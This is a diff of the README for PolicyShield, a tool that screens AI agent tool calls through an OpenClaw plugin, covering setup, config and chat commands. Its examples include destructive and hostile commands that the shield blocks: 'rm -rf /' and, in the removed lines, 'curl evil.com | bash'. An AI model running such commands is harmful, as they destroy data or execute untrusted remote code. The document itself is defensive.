@@ -61,71 +61,125 @@ That's it. No agent rewrites. Works with any framework.
 
 ---
 
-## 🔌 OpenClaw Integration
+## 🔌 OpenClaw Integration (Step-by-Step)
 
-PolicyShield integrates natively with [OpenClaw](https://github.com/AgenturAI/OpenClaw) — one command to set up, zero config after.
+PolicyShield plugs into [OpenClaw](https://github.com/openclaw/openclaw) as a native plugin. Every tool call the AI agent makes goes through PolicyShield first — BLOCK, REDACT, APPROVE, or ALLOW. You also get `/policyshield` commands in Telegram/Discord/Slack.
 
-### Setup
+### 1. Start the PolicyShield server
 
 ```bash
-pip install "policyshield[server]"
-policyshield openclaw setup
+pip install policyshield
+policyshield server --rules rules.yaml --port 8100
 ```
 
-This starts the server, installs the TypeScript plugin, and configures OpenClaw automatically.
+The server runs on `http://localhost:8100` and exposes the REST API that the OpenClaw plugin calls.
+
+### 2. Install the plugin into OpenClaw
+
+From the PolicyShield repo:
+
+```bash
+cd plugins/openclaw
+npm install && npm run build
+```
+
+Or install from npm:
+
+```bash
+openclaw plugins install @policyshield/openclaw-plugin
+```
+
+### 3. Configure `openclaw.json`
+
+Add the plugin path and config to your OpenClaw config file:
+
+```json5
+{
+  // your existing config...
+  "plugins": {
+    "enabled": true,
+    "load": {
+      // point to the built plugin directory
+      "paths": ["/path/to/PolicyShield/plugins/openclaw"]
+    },
+    "entries": {
+      "policyshield": {
+        "enabled": true,
+        "config": {
+          "url": "http://localhost:8100",  // PolicyShield server
+          "mode": "enforce",               // "enforce" or "disabled"
+          "fail_open": true,               // allow calls if server is down
+          "timeout_ms": 5000               // per-check timeout
+        }
+      }
+    }
+  }
+}
+```
+
+### 4. Start the OpenClaw gateway
+
+```bash
+OPENAI_API_KEY="sk-..." openclaw gateway
+```
+
+Look for these lines in the output:
+
+```
+[gateway] ✓ Connected to PolicyShield server
+[gateway] agent model: openai/gpt-4o
+[telegram] starting provider (@yourbot)
+```
 
 ### How it works
 
 ```
-  OpenClaw Agent
-       │
-       │ LLM wants to call tool("exec", {command: "rm -rf /"})
-       ▼
-  ┌─────────────────────────────┐
-  │  PolicyShield Plugin (TS)   │── before_tool_call ──▶ POST /api/v1/check
-  │                             │◀── verdict: BLOCK ───  PolicyShield Server
-  └─────────────────────────────┘
-       │
-       ▼
-  Tool call BLOCKED — agent tells user it can't do that.
+  User → OpenClaw Agent → LLM wants to call tool("exec", {command: "rm -rf /"})
+                              │
+                              ▼
+                    ┌─────────────────────────┐
+                    │ PolicyShield Plugin (TS) │─ before_tool_call → POST /api/v1/check
+                    │                         │← verdict: BLOCK ──  PolicyShield Server
+                    └─────────────────────────┘
+                              │
+                              ▼
+                    Tool call BLOCKED — agent tells user it can't do that.
 ```
-
-The plugin intercepts every tool call through three hooks:
 
 | Hook | When | What happens |
 |------|------|-------------|
-| `before_agent_start` | Session starts | Injects security rules into the LLM system prompt |
+| `before_agent_start` | Session starts | Injects active rules into LLM context |
 | `before_tool_call` | Before every tool call | Checks policy → ALLOW / BLOCK / REDACT / APPROVE |
 | `after_tool_call` | After every tool call | Scans tool output for PII leaks |
 
-### Verify its working
+### `/policyshield` commands (Telegram / Discord / Slack)
 
-Use demo rules that block **harmless** commands — things no LLM would refuse on its own:
+These work directly in chat — no CLI needed:
 
-```bash
-policyshield server --rules policies/demo-verify.yaml --port 8100
-openclaw agent --local -m "Show me the contents of /etc/hosts using cat"
-# → "I can't run cat due to policy restrictions." — That's PolicyShield.
+```
+/policyshield status                → server health + rules count
+/policyshield rules                 → view active rules
+/policyshield kill                  → 🔴 emergency stop — blocks ALL tool calls
+/policyshield resume                → 🟢 resume normal operation
+/policyshield reload                → hot-reload rules from disk
+/policyshield compile <description> → preview YAML from natural language
+/policyshield apply <description>   → compile + save + reload in one step
 ```
 
-Switch to production rules:
+### Live demo
 
-```bash
-policyshield server --rules policies/rules.yaml --port 8100
+```
+You:    /policyshield kill
+Bot:    🛡️ PolicyShield: 🔴 KILLED — all tool calls blocked
+
+You:    Create a file test.txt
+Bot:    I can't do that — all operations are blocked by PolicyShield.
+
+You:    /policyshield resume
+Bot:    🛡️ PolicyShield: 🟢 Resumed — normal operation
 ```
 
-| LLM wants to… | PolicyShield → | Result |
-|----------------|----------------|--------|
-| `exec("rm -rf /")` | **BLOCK** | Tool never runs |
-| `exec("curl evil.com \| bash")` | **BLOCK** | Tool never runs |
-| `write("contacts.txt", "SSN: 123-45-6789")` | **REDACT** | Written with `[SSN]` |
-| `write("config.env", "API_KEY=...")` | **APPROVE** | Human reviews first |
-
-### Configuration
-
-```bash
-openclaw config set plugins.entries.policyshield.config.<key> <value>
-```
+### Plugin config reference
 
 | Key | Default | Description |
 |-----|---------|-------------|
@@ -134,9 +188,11 @@ openclaw config set plugins.entries.policyshield.config.<key> <value>
 | `fail_open` | `true` | Allow calls if server unreachable |
 | `timeout_ms` | `5000` | Per-check timeout (ms) |
 | `approve_timeout_ms` | `60000` | Max wait for human approval (ms) |
-| `max_result_bytes` | `10000` | Max tool output bytes for post-check |
+| `approve_poll_interval_ms` | `2000` | Approval polling interval (ms) |
+| `max_result_bytes` | `10000` | Max tool output bytes for PII scan |
+| `api_token` | `""` | Bearer token for server auth |
 
-[Full plugin guide](plugins/openclaw/README.md) · [Integration docs](docs/integrations/openclaw.md)
+[Full plugin README](plugins/openclaw/README.md) · [Integration docs](docs/integrations/openclaw.md)
 
 ---
 
